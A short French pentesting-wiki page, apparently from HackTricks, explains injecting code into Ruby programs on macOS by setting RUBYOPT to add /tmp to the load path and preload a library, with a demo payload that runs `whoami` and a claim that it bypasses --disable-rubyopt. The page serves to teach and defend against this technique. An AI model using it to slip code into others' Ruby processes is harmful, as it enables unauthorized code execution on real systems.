# Injection dans les applications Ruby de macOS

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

À l'aide de cette variable d'environnement, il est possible **d'ajouter de nouveaux paramètres** à **ruby** chaque fois qu'il est exécuté. Bien que le paramètre **`-e`** ne puisse pas être utilisé pour spécifier du code Ruby à exécuter, il est possible d'utiliser les paramètres **`-I`** et **`-r`** pour ajouter un nouveau dossier au chemin de chargement des bibliothèques, puis **spécifier une bibliothèque à charger**.

Créez la bibliothèque **`inject.rb`** dans **`/tmp`** :
```ruby:inject.rb
puts `whoami`
```
Créez n'importe où un script Ruby comme suit :
```ruby:hello.rb
puts 'Hello, World!'
```
Ensuite, faites charger un script Ruby arbitraire avec :
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Fait amusant, cela fonctionne même avec le paramètre **`--disable-rubyopt`** :
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
